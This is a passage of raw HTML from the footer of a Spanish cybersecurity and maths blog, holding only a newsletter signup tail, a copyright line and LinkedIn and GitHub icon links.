<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">Ver historial de resúmenes</a></p><p class="tc">impulsado por <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>